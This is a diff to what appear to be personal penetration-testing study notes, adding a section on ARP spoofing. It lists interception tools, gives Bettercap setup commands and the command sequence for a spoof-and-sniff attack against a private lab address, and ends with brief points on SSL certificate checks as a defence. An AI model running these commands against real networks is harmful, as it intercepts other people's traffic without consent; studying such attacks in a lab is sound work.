@@ -75,3 +75,30 @@ systemctl status nessusd
 
 ***1.After everything is done, you should land to the base UI***
 ***2. If you can't create new scan, this is most likely because plugins are still configuring***
+
+# ARP Spoofing attacks with the following tools:
+**Ettercap** (https://www.ettercap-project.org/)
+**MITM Framework** (https://github.com/byt3bl33d3r/MITMf)
+Driftnet (https://www.kali.org/tools/driftnet/
+
+## Performing MITM with Bettercap
+```sh
+sudo apt-get install bettercap
+sudo bettercap --iface <interface>
+```
+
+Running the ARP spoof attack
+ ▪ net.probe on
+ ▪ set arp.spoof.duplex true
+ ▪ set arp.spoof.targets 192.168.74.128
+ ▪ arp.spoof on
+ ▪ net.sniff on
+
+
+##  How SSL Verification Stop MITM?
+▪To prevent man-in-the-middle (MITM) attacks by verifying SSL 
+certificates, you should take the following steps:
+ ▪ Ensure that the SSL certificate is from a trusted certificate authority 
+(CA) and has not been revoked
+ ▪Verify that the domain name in the certificate matches the domain 
+name of the website you are visiting
